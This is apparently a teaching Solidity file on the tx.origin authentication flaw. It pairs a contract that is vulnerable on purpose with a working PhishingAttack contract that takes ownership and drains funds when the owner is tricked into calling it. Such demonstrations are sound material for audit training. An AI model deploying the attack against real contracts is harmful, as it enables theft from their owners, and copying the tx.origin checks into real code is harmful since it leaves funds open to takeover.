// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title TX Origin Authentication
 * @notice Demonstrates tx.origin vulnerability
 * @dev Phishing attack possible
 */
contract TxOrigin {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    /**
     * @notice Transfer ownership using tx.origin
     * @dev VULNERABLE: Uses tx.origin for authentication
     */
    function transferOwnership(address newOwner) public {
        // VULNERABILITY: tx.origin can be manipulated via phishing
        require(tx.origin == owner, "Not owner");
        owner = newOwner;
    }

    /**
     * @notice Withdraw funds using tx.origin
     * @dev VULNERABLE: Phishing attack possible
     */
    function withdraw(uint256 amount) public {
        // VULNERABILITY: Attacker can trick owner to call malicious contract
        require(tx.origin == owner, "Not owner");
        payable(msg.sender).transfer(amount);
    }

    /**
     * @notice Execute arbitrary call
     * @dev VULNERABLE: tx.origin authentication
     */
    function executeCall(address target, bytes memory data) public returns (bool, bytes memory) {
        require(tx.origin == owner, "Not owner");

        // VULNERABILITY: Can be exploited via intermediary contract
        return target.call(data);
    }

    receive() external payable {}
}

/**
 * @title Malicious Phishing Contract
 * @notice Exploits tx.origin vulnerability
 */
contract PhishingAttack {
    TxOrigin public victim;
    address public attacker;

    constructor(address _victim) {
        victim = TxOrigin(_victim);
        attacker = msg.sender;
    }

    /**
     * @notice Trick owner to call this, stealing ownership
     */
    function attack() public {
        // When owner calls this function:
        // - tx.origin = owner (victim)
        // - msg.sender = this contract
        // This bypasses the tx.origin check!
        victim.transferOwnership(attacker);
    }

    /**
     * @notice Drain funds
     */
    function drainFunds() public {
        victim.withdraw(address(victim).balance);
    }
}
